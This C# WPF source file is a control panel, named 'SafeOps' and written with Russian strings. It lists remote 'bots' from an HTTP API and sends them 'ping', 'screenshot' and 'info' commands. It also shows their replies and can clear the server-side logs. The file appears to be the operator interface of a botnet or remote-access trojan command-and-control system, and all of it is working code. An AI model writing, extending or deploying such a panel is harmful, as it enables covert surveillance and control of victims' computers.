using System;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Json;
using System.Runtime.CompilerServices;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;

namespace SafeOps.Panel
{
    public sealed class BotInfo : INotifyPropertyChanged
    {
        [JsonPropertyName("id")]
        public string Id { get; set; } = string.Empty;

        [JsonPropertyName("hostname")]
        public string Hostname { get; set; } = string.Empty;

        [JsonPropertyName("lastSeen")]
        public DateTime LastSeen { get; set; }

        [JsonPropertyName("queueSize")]
        public int QueueSize { get; set; }

        public string LastSeenLocal => LastSeen == default
            ? "never"
            : LastSeen.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");

        public string Status
        {
            get
            {
                if (LastSeen == default) return "offline";
                return DateTime.UtcNow - LastSeen.ToUniversalTime() <= TimeSpan.FromSeconds(30)
                    ? "online"
                    : "offline";
            }
        }

        public event PropertyChangedEventHandler? PropertyChanged;
    }

    public sealed class ResponseEntry
    {
        [JsonPropertyName("time")]
        public string Time { get; set; } = string.Empty;

        [JsonPropertyName("hostname")]
        public string Hostname { get; set; } = string.Empty;

        [JsonPropertyName("message")]
        public string Message { get; set; } = string.Empty;

        public string TimeLocal => Time;
    }

    public sealed class PanelSettings
    {
        public string ServerAddress { get; set; } = "http://localhost:12346";
        public bool AutoRefresh { get; set; } = true;
        public int RefreshIntervalSeconds { get; set; } = 2;
    }

    public partial class MainWindow : Window, INotifyPropertyChanged
    {
        private static readonly JsonSerializerOptions JsonOptions = new(JsonSerializerDefaults.Web)
        {
            WriteIndented = true,
            PropertyNameCaseInsensitive = true
        };

        private readonly ObservableCollection<BotInfo> _clients = new();
        private readonly ObservableCollection<ResponseEntry> _responses = new();
        private readonly string _settingsPath;
        private Timer? _refreshTimer;
        private HttpClient _httpClient = new();
        private PanelSettings _settings = new();
        private bool _isRefreshing;
        private string _statusText = "Ожидание";
        private string _footerText = "Готово";
        private string _lastRefreshText = "еще не обновлялось";
        private Brush _connectionBrush = Brushes.Gray;

        public MainWindow()
        {
            InitializeComponent();
            DataContext = this;

            _settingsPath = Path.Combine(AppContext.BaseDirectory, "panel_settings.json");
            ClientsGrid.ItemsSource = _clients;
            LogsGrid.ItemsSource = _responses;
        }

        public string StatusText
        {
            get => _statusText;
            private set => SetField(ref _statusText, value);
        }

        public string FooterText
        {
            get => _footerText;
            private set => SetField(ref _footerText, value);
        }

        public string LastRefreshText
        {
            get => _lastRefreshText;
            private set => SetField(ref _lastRefreshText, value);
        }

        public Brush ConnectionBrush
        {
            get => _connectionBrush;
            private set => SetField(ref _connectionBrush, value);
        }

        public event PropertyChangedEventHandler? PropertyChanged;

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            await LoadSettingsAsync();
            ApplySettingsToControls();

            if (!TryRecreateHttpClient())
                return;

            ScheduleRefresh();
            await RefreshDataAsync();
        }

        private async Task LoadSettingsAsync()
        {
            try
            {
                if (!File.Exists(_settingsPath))
                    return;

                await using var stream = File.OpenRead(_settingsPath);
                _settings = await JsonSerializer.DeserializeAsync<PanelSettings>(stream, JsonOptions) ?? new PanelSettings();
                _settings.ServerAddress = NormalizeServerAddress(_settings.ServerAddress);
                _settings.RefreshIntervalSeconds = Math.Clamp(_settings.RefreshIntervalSeconds, 1, 3600);
            }
            catch (Exception ex)
            {
                AddLocalLog("settings", $"Не удалось прочитать настройки: {ex.Message}");
            }
        }

        private async Task SaveSettingsAsync()
        {
            _settings = ReadSettingsFromControls();
            await using var stream = File.Create(_settingsPath);
            await JsonSerializer.SerializeAsync(stream, _settings, JsonOptions);
            AddLocalLog("settings", "Настройки сохранены");
        }

        private PanelSettings ReadSettingsFromControls()
        {
            if (!int.TryParse(RefreshIntervalTextBox?.Text?.Trim(), out var interval))
                interval = 2;

            return new PanelSettings
            {
                ServerAddress = NormalizeServerAddress(ServerAddressTextBox?.Text ?? _settings.ServerAddress),
                AutoRefresh = AutoRefreshCheckBox?.IsChecked ?? _settings.AutoRefresh,
                RefreshIntervalSeconds = Math.Clamp(interval, 1, 3600)
            };
        }

        private static string NormalizeServerAddress(string? address)
        {
            address = string.IsNullOrWhiteSpace(address)
                ? "http://localhost:12346"
                : address.Trim();
            return address.TrimEnd('/');
        }

        private void ApplySettingsToControls()
        {
            ServerAddressTextBox.Text = _settings.ServerAddress;
            AutoRefreshCheckBox.IsChecked = _settings.AutoRefresh;
            RefreshIntervalTextBox.Text = _settings.RefreshIntervalSeconds.ToString();
        }

        private bool TryRecreateHttpClient()
        {
            var baseAddress = NormalizeServerAddress(_settings.ServerAddress);
            if (!Uri.TryCreate(baseAddress + "/", UriKind.Absolute, out var uri) ||
                (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps))
            {
                StatusText = "Ошибка";
                FooterText = "Адрес API должен быть абсолютным HTTP/HTTPS URL.";
                ConnectionBrush = Brushes.OrangeRed;
                AddLocalLog("settings", FooterText);
                return false;
            }

            _httpClient.Dispose();
            _httpClient = new HttpClient { BaseAddress = uri, Timeout = TimeSpan.FromSeconds(8) };
            return true;
        }

        private void ScheduleRefresh()
        {
            if (_refreshTimer != null)
                _refreshTimer.Dispose();

            if (!_settings.AutoRefresh)
                return;

            _refreshTimer = new Timer(async _ => await RefreshDataAsync(), null,
                TimeSpan.FromSeconds(_settings.RefreshIntervalSeconds),
                TimeSpan.FromSeconds(_settings.RefreshIntervalSeconds));
        }

        private async Task RefreshDataAsync()
        {
            if (_isRefreshing) return;
            _isRefreshing = true;

            await Dispatcher.InvokeAsync(() =>
            {
                StatusText = "Обновление";
                FooterText = "Запрашиваю список узлов...";
                ConnectionBrush = Brushes.Goldenrod;
            });

            try
            {
                await RefreshClientsAsync();
                await RefreshResponsesAsync();
                await Dispatcher.InvokeAsync(() =>
                {
                    LastRefreshText = $"обновлено {DateTime.Now:HH:mm:ss}";
                    StatusText = "Онлайн";
                    FooterText = $"Узлов: {_clients.Count}. Последнее обновление успешно.";
                    ConnectionBrush = Brushes.LimeGreen;
                });
            }
            catch (Exception ex)
            {
                await Dispatcher.InvokeAsync(() =>
                {
                    StatusText = "Нет связи";
                    FooterText = ex is TaskCanceledException
                        ? "Сервер не ответил за отведенное время."
                        : $"Ошибка подключения: {ex.Message}";
                    ConnectionBrush = Brushes.OrangeRed;
                    AddLocalLog("network", FooterText);
                });
            }
            finally
            {
                _isRefreshing = false;
            }
        }

        private async Task RefreshClientsAsync()
        {
            string? selectedId = null;
            await Dispatcher.InvokeAsync(() =>
            {
                selectedId = (ClientsGrid.SelectedItem as BotInfo)?.Id;
            });

            using var response = await _httpClient.GetAsync("/clients");
            response.EnsureSuccessStatusCode();

            var clients = await response.Content.ReadFromJsonAsync<BotInfo[]>(JsonOptions) ?? Array.Empty<BotInfo>();
            await Dispatcher.InvokeAsync(() =>
            {
                _clients.Clear();
                foreach (var client in clients.OrderBy(c => c.Hostname))
                    _clients.Add(client);

                if (!string.IsNullOrEmpty(selectedId))
                {
                    var restored = _clients.FirstOrDefault(c => c.Id == selectedId);
                    if (restored != null)
                        ClientsGrid.SelectedItem = restored;
                }
            });
        }

        private async Task RefreshResponsesAsync()
        {
            using var response = await _httpClient.GetAsync("/responses");
            if (!response.IsSuccessStatusCode) return;

            var entries = await response.Content.ReadFromJsonAsync<ResponseEntry[]>(JsonOptions) ?? Array.Empty<ResponseEntry>();
            await Dispatcher.InvokeAsync(() =>
            {
                _responses.Clear();
                foreach (var entry in entries.Reverse())
                {
                    _responses.Add(entry);
                }
            });
        }

        private async Task SendCommandAsync(string command, BotInfo target)
        {
            if (target == null) return;

            var payload = new { bot_id = target.Id, command };
            var content = JsonContent.Create(payload, options: JsonOptions);
            try
            {
                using var response = await _httpClient.PostAsync("/send", content);
                response.EnsureSuccessStatusCode();
                AddLocalLog(target.Hostname, $"Отправлено: {command}");
                await RefreshResponsesAsync();
            }
            catch (Exception ex)
            {
                AddLocalLog("network", $"Ошибка отправки команды {command}: {ex.Message}");
                FooterText = $"Ошибка: {ex.Message}";
            }
        }

        private void AddLocalLog(string source, string message)
        {
            var entry = new ResponseEntry
            {
                Time = DateTime.Now.ToString("HH:mm:ss"),
                Hostname = source,
                Message = message
            };
            Dispatcher.Invoke(() => _responses.Add(entry));
        }

        private async Task ClearLogsOnServerAsync()
        {
            try
            {
                var response = await _httpClient.DeleteAsync("/responses");
                if (response.IsSuccessStatusCode)
                {
                    AddLocalLog("panel", "Логи на сервере очищены");
                    await RefreshResponsesAsync();
                }
                else
                {
                    AddLocalLog("panel", $"Не удалось очистить логи на сервере: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                AddLocalLog("network", $"Ошибка очистки логов: {ex.Message}");
            }
        }

        private async void RefreshButton_Click(object sender, RoutedEventArgs e) => await RefreshDataAsync();

        private async void ContextMenuPing_Click(object sender, RoutedEventArgs e)
        {
            if (ClientsGrid.SelectedItem is BotInfo selected)
                await SendCommandAsync("ping", selected);
            else
                MessageBox.Show("Выберите клиента.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
        }

        private async void ContextMenuScreenshot_Click(object sender, RoutedEventArgs e)
        {
            if (ClientsGrid.SelectedItem is BotInfo selected)
                await SendCommandAsync("screenshot", selected);
            else
                MessageBox.Show("Выберите клиента.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
        }

        private async void ContextMenuInfo_Click(object sender, RoutedEventArgs e)
        {
            if (ClientsGrid.SelectedItem is BotInfo selected)
                await SendCommandAsync("info", selected);
            else
                MessageBox.Show("Выберите клиента.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
        }

        private void DataGridRow_MouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var row = sender as DataGridRow;
            if (row != null)
            {
                ClientsGrid.SelectedItem = row.Item;
                if (row.ContextMenu != null)
                    row.ContextMenu.IsOpen = true;
                e.Handled = true;
            }
        }

        private async void ClearLogsButton_Click(object sender, RoutedEventArgs e)
        {
            await ClearLogsOnServerAsync();
        }

        private async void SaveSettingsButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                await SaveSettingsAsync();
                if (TryRecreateHttpClient())
                {
                    ScheduleRefresh();
                    FooterText = "Настройки сохранены и применены.";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Не удалось сохранить настройки: {ex.Message}", "SafeOps", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async void TestConnectionButton_Click(object sender, RoutedEventArgs e)
        {
            _settings = ReadSettingsFromControls();
            if (!TryRecreateHttpClient()) return;

            try
            {
                using var response = await _httpClient.GetAsync("/clients");
                FooterText = response.IsSuccessStatusCode
                    ? "Связь проверена: API отвечает."
                    : $"API ответил статусом {(int)response.StatusCode}.";
                StatusText = response.IsSuccessStatusCode ? "Онлайн" : "Ошибка";
                ConnectionBrush = response.IsSuccessStatusCode ? Brushes.LimeGreen : Brushes.OrangeRed;
                AddLocalLog("network", FooterText);
            }
            catch (Exception ex)
            {
                FooterText = $"Проверка связи не прошла: {ex.Message}";
                StatusText = "Нет связи";
                ConnectionBrush = Brushes.OrangeRed;
                AddLocalLog("network", FooterText);
            }
        }

        private void AutoRefreshCheckBox_Changed(object sender, RoutedEventArgs e)
        {
            _settings = ReadSettingsFromControls();
            ScheduleRefresh();
        }

        private void DecreaseIntervalButton_Click(object sender, RoutedEventArgs e)
        {
            if (int.TryParse(RefreshIntervalTextBox.Text.Trim(), out int current))
                RefreshIntervalTextBox.Text = Math.Max(1, current - 1).ToString();
        }

        private void IncreaseIntervalButton_Click(object sender, RoutedEventArgs e)
        {
            if (int.TryParse(RefreshIntervalTextBox.Text.Trim(), out int current))
                RefreshIntervalTextBox.Text = (current + 1).ToString();
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            _refreshTimer?.Dispose();
            _httpClient.Dispose();
            base.OnClosing(e);
        }

        private bool SetField<T>(ref T field, T value, [CallerMemberName] string? propertyName = null)
        {
            if (Equals(field, value)) return false;
            field = value;
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
            return true;
        }
    }
}